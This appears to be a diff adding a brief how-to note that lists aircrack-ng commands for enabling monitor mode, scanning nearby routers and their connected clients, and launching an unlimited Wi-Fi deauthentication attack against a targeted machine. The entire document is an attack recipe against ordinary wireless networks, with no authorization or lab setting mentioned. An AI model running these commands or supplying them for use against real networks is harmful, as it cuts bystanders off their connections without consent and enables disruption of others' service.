@@ -1,0 +1,24 @@
+1. get <adapter interface>, run:
+iwconfig
+
+2. enter monitor mode, run:
+sudo airmon-ng start <adapter interface>
+
+3. test the adapter, run:
+sudo aireplay-ng --test wlan0mon
+
+4. now wlan0mon will be listed in iwconfig, run:
+iwconfig
+
+5. see the nearby routers, run:
+sudo airodump-ng wlan0mon
+
+6. see the machines interacting with a specific router, run:
+sudo airodump-ng wlan0mon --bssid <router's bssid> --channel <channel no.>
+
+7. run deauth attack to specific machine, run:
+sudo aireplay-ng --deauth 0 -c <mac address of machine> -a <bssid of router> wlan0mon
+
+8. wifi won't work on the targeted machine and see the attack working, run the following on the target machine:
+tshark -i wlan0mon
+
